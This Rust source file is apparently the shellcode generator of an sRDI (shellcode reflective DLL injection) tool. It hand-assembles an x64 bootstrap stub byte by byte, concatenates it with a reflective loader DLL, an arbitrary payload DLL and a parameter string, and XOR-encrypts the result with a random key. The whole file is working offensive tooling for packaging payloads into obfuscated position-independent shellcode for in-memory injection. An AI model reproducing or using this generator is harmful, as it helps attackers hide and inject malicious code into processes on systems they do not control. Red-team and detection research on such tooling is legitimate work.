use std::{collections::BTreeMap, ffi::CStr, fs, path::PathBuf, slice::from_raw_parts};

use airborne_utils::calc_hash;
use clap::Parser;
use windows_sys::Win32::{
    System::Diagnostics::Debug::IMAGE_NT_HEADERS64,
    System::{
        Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER},
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY},
    },
};

#[derive(Parser, Debug)]
#[command(version)]
struct Args {
    /// Path to the sRDI loader DLL
    #[arg(short, long = "loader")]
    loader_path: PathBuf,
    /// Path to the payload DLL
    #[arg(short, long = "payload")]
    payload_path: PathBuf,
    /// Name of the function to call in the payload DLL
    #[arg(short, long = "function")]
    function_name: String,
    /// Parameter to pass to the function
    #[arg(short = 'n', long)]
    parameter: String,
    /// Path to the output file
    #[arg(short, long = "output")]
    output_path: PathBuf,
    /// Flag to pass to the loader (by default DllMain is called)
    #[arg(long, default_value_t = 0)]
    flag: u32, // preferably set type as u32 here instead of casting it when generating bootstrap
}

// NOTE: must be updated accordingly if the loader name or the bootstrap code is modified
const LOADER_ENTRY_NAME: &str = "loader";
const BOOTSTRAP_TOTAL_LENGTH: u32 = 79;

fn main() {
    let args = Args::parse();

    // preserve the path from being dropped
    let output_path = args.output_path.clone();

    let loader_path_str = args.loader_path.to_str().unwrap();
    let payload_path_str = args.payload_path.to_str().unwrap();
    let output_path_str = args.output_path.to_str().unwrap();

    println!("[+] reflective loader: {}", loader_path_str);
    println!("[+] payload: {}", payload_path_str);
    println!("[+] output: {}", output_path_str);

    let mut loader_b = fs::read(args.loader_path).expect("failed to read sRDI DLL");
    let mut payload_b = fs::read(args.payload_path).expect("failed to read payload DLL");
    let function_hash = calc_hash(args.function_name.as_bytes());

    let mut shellcode = gen_sc(
        &mut loader_b,
        &mut payload_b,
        function_hash,
        args.parameter,
        args.flag,
    );

    println!("\n[+] xor'ing shellcode");
    let key = gen_xor_key(shellcode.len());
    airborne_utils::xor_cipher(&mut shellcode, &key);
    let mut key_output_path = output_path.clone().into_os_string();
    key_output_path.push(".key");
    let key_output_path_str = key_output_path.to_str().unwrap();

    println!("\n[+] writing shellcode to '{}'", output_path_str);
    fs::write(output_path, shellcode).expect("failed to write shellcode to output file");
    println!("[+] writing xor key to '{}'", key_output_path_str);
    fs::write(key_output_path, key).expect("failed to write xor key to output file");
}

fn gen_sc(
    loader_b: &mut Vec<u8>,
    payload_b: &mut Vec<u8>,
    function_hash: u32,
    parameter: String,
    flag: u32,
) -> Vec<u8> {
    let loader_addr = export_ptr_by_name(loader_b.as_mut_ptr(), LOADER_ENTRY_NAME)
        .expect("failed to get loader entry point");
    let loader_offset = loader_addr as usize - loader_b.as_mut_ptr() as usize;
    println!("[+] loader offset: {:#x}", loader_offset);

    // 64-bit bootstrap source: https:// github.com/memN0ps/srdi-rs/blob/main/generate_shellcode

    // TODO: clean up & fix 'call to push immediately after creation' compiler warning by
    //       calculating little-endian representations of variables (flag, parameter length & offset,
    //       function hash, payload offset, loader address) beforehand

    let mut bootstrap: Vec<u8> = Vec::new();

    /*
        1.) save the current location in memory for calculating offsets later
    */

    // call 0x00 (this will push the address of the next function to the stack)
    bootstrap.push(0xe8);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);
    bootstrap.push(0x00);

    // pop rcx - this will pop the value we saved on the stack into rcx to capture our current location in memory
    bootstrap.push(0x59);

    // mov r8, rcx - copy the value of rcx into r8 before we start modifying RCX
    bootstrap.push(0x49);
    bootstrap.push(0x89);
    bootstrap.push(0xc8);

    /*
        2.) align the stack and create shadow space
    */

    // push rsi - save original value
    bootstrap.push(0x56);

    // mov rsi, rsp - store our current stack pointer for later
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xe6);

    // and rsp, 0x0FFFFFFFFFFFFFFF0 - align the stack to 16 bytes
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xe4);
    bootstrap.push(0xf0);

    // sub rsp, 0x30 (48 bytes) - create shadow space on the stack, which is required for x64. A minimum of 32 bytes for rcx, rdx, r8, r9. Then other params on stack
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0xec);
    bootstrap.push(6 * 8); // 6 args that are 8 bytes each

    /*
        3.) setup reflective loader parameters: place the last 5th and 6th arguments on the stack (rcx, rdx, r8, and r9 are already on the stack as the first 4 arguments)
    */

    // mov qword ptr [rsp + 0x20], rcx (shellcode base + 5 bytes) - (32 bytes) Push in arg 5
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0x4C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg

    // sub qword ptr [rsp + 0x20], 0x5 (shellcode base) - modify the 5th arg to get the real shellcode base
    bootstrap.push(0x48);
    bootstrap.push(0x83);
    bootstrap.push(0x6C);
    bootstrap.push(0x24);
    bootstrap.push(4 * 8); // 5th arg
    bootstrap.push(5); // minus 5 bytes because call 0x00 is 5 bytes to get the allocate memory from VirtualAllocEx from injector

    // mov dword ptr [rsp + 0x28], <flag> - (40 bytes) Push arg 6 just above shadow space
    bootstrap.push(0xC7);
    bootstrap.push(0x44);
    bootstrap.push(0x24);
    bootstrap.push(5 * 8); // 6th arg
    bootstrap.append(&mut flag.to_le_bytes().to_vec().clone());

    /*
        4.) setup reflective loader parameters: 1st -> rcx, 2nd -> rdx, 3rd -> r8, 4th -> r9
    */

    // mov r9, <parameter_length> - copy the 4th parameter, which is the length of the user data into r9
    bootstrap.push(0x41);
    bootstrap.push(0xb9);
    let parameter_length = parameter.len() as u32; // This must u32 or it breaks assembly
    bootstrap.append(&mut parameter_length.to_le_bytes().to_vec().clone());

    // add r8, <parameter_offset> + <payload_length> - copy the 3rd parameter, which is address of the user function into r8 after calculation
    bootstrap.push(0x49);
    bootstrap.push(0x81);
    bootstrap.push(0xc0); // minus 5 because of the call 0x00 instruction
    let parameter_offset =
        (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_b.len() as u32 + payload_b.len() as u32;
    bootstrap.append(&mut parameter_offset.to_le_bytes().to_vec().clone());

    // mov edx, <prameter_hash> - copy the 2nd parameter, which is the hash of the user function into edx
    bootstrap.push(0xba);
    bootstrap.append(&mut function_hash.to_le_bytes().to_vec().clone());

    // add rcx, <payload_offset> - copy the 1st parameter, which is the address of the user dll into rcx after calculation
    bootstrap.push(0x48);
    bootstrap.push(0x81);
    bootstrap.push(0xc1); // minus 5 because of the call 0x00 instruction
    let payload_offset = (BOOTSTRAP_TOTAL_LENGTH - 5) + loader_b.len() as u32; // mut be u32 or it breaks assembly
    bootstrap.append(&mut payload_offset.to_le_bytes().to_vec().clone());

    /*
        5.) call the reflective loader
    */

    // call <loader_offset> - call the reflective loader address after calculation
    bootstrap.push(0xe8);
    let loader_address =
        (BOOTSTRAP_TOTAL_LENGTH - bootstrap.len() as u32 - 4) + loader_offset as u32; // must be u32 or it breaks assembly
    bootstrap.append(&mut loader_address.to_le_bytes().to_vec().clone());

    // padding
    bootstrap.push(0x90);
    bootstrap.push(0x90);

    /*
        6.) restore the stack and return to the original location (caller)
    */

    // mov rsp, rsi - reset original stack pointer
    bootstrap.push(0x48);
    bootstrap.push(0x89);
    bootstrap.push(0xf4);

    // pop rsi - put things back where they were left
    bootstrap.push(0x5e);

    // ret - return to caller and resume execution flow (avoids crashing process)
    bootstrap.push(0xc3);

    // padding
    bootstrap.push(0x90);
    bootstrap.push(0x90);

    if bootstrap.len() != BOOTSTRAP_TOTAL_LENGTH as usize {
        panic!("Bootstrap length is not correct, please modify the BOOTSTRAP_TOTAL_LEN constant in the source");
    } else {
        println!("[+] bootstrap size: {}", bootstrap.len());
    }

    println!("[+] reflective loader size: {}", loader_b.len());
    println!("[+] payload size: {}", payload_b.len());

    let mut shellcode = Vec::new();

    shellcode.append(&mut bootstrap);
    shellcode.append(loader_b);
    shellcode.append(payload_b);
    shellcode.append(&mut parameter.as_bytes().to_vec());

    /*
        the final PIC shellcode will have the following memory layout:
            - bootstrap
            - sRDI shellcode
            - payload DLL bytes
            - user data
    */

    println!("\n[+] total shellcode size: {}", shellcode.len());
    println!("\n[+] loader(payload_dll_ptr: *mut c_void, function_hash: u32, user_data_ptr: *mut c_void, user_data_len: u32, shellcode_bin_ptr: *mut c_void, flag: u32)");
    println!(
        "[+] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]"
    );
    println!(
        "[+] rcx: {:#x} rdx: {:#x} r8: {}, r9: {:#x}, arg5: shellcode.bin address, arg6: {}",
        payload_offset,
        function_hash,
        parameter,
        parameter.len(),
        flag
    );

    shellcode
}

fn gen_xor_key(keysize: usize) -> Vec<u8> {
    let mut key = Vec::new();

    for _ in 0..keysize {
        key.push(rand::random::<u8>());
    }

    key
}

fn export_ptr_by_name(base_ptr: *mut u8, name: &str) -> Option<*mut u8> {
    for (e_name, addr) in unsafe { get_exports(base_ptr) } {
        if e_name == name {
            return Some(addr as _);
        }
    }

    None
}

unsafe fn get_exports(base_ptr: *mut u8) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();

    let dos_header_ptr = base_ptr as *mut IMAGE_DOS_HEADER;

    if (*dos_header_ptr).e_magic != IMAGE_DOS_SIGNATURE {
        panic!("Failed to get DOS header");
    }

    let nt_header_ptr = rva_mut::<IMAGE_NT_HEADERS64>(base_ptr, (*dos_header_ptr).e_lfanew as _);
    let export_dir_ptr = rva_to_offset(
        base_ptr as _,
        &*nt_header_ptr,
        (*nt_header_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress,
    ) as *mut IMAGE_EXPORT_DIRECTORY;

    let export_names = from_raw_parts(
        rva_to_offset(
            base_ptr as _,
            &*nt_header_ptr,
            (*export_dir_ptr).AddressOfNames,
        ) as *const u32,
        (*export_dir_ptr).NumberOfNames as _,
    );
    let export_functions = from_raw_parts(
        rva_to_offset(
            base_ptr as _,
            &*nt_header_ptr,
            (*export_dir_ptr).AddressOfFunctions,
        ) as *const u32,
        (*export_dir_ptr).NumberOfFunctions as _,
    );
    let export_ordinals = from_raw_parts(
        rva_to_offset(
            base_ptr as _,
            &*nt_header_ptr,
            (*export_dir_ptr).AddressOfNameOrdinals,
        ) as *const u16,
        (*export_dir_ptr).NumberOfNames as _,
    );

    for i in 0..(*export_dir_ptr).NumberOfNames as usize {
        let export_name =
            rva_to_offset(base_ptr as _, &*nt_header_ptr, export_names[i]) as *const i8;

        if let Ok(export_name) = CStr::from_ptr(export_name).to_str() {
            let export_ordinal = export_ordinals[i] as usize;
            exports.insert(
                export_name.to_string(),
                rva_to_offset(
                    base_ptr as _,
                    &*nt_header_ptr,
                    export_functions[export_ordinal],
                ),
            );
        }
    }

    exports
}

fn rva_mut<T>(base_ptr: *mut u8, rva: usize) -> *mut T {
    (base_ptr as usize + rva) as *mut T
}

unsafe fn rva_to_offset(base: usize, nt_header_ref: &IMAGE_NT_HEADERS64, mut rva: u32) -> usize {
    let section_header_ptr = rva_mut::<IMAGE_SECTION_HEADER>(
        &nt_header_ref.OptionalHeader as *const _ as _,
        nt_header_ref.FileHeader.SizeOfOptionalHeader as _,
    );
    let section_count = nt_header_ref.FileHeader.NumberOfSections;

    for i in 0..section_count as usize {
        let virtual_addr = (*section_header_ptr.add(i)).VirtualAddress;
        let virtual_size = (*section_header_ptr.add(i)).Misc.VirtualSize;

        // check if the rva is within the current section
        if virtual_addr <= rva && virtual_addr + virtual_size > rva {
            // adjust the rva to be relative to the start of the section in the file
            rva -= (*section_header_ptr.add(i)).VirtualAddress;
            rva += (*section_header_ptr.add(i)).PointerToRawData;

            return base + rva as usize;
        }
    }

    0
}
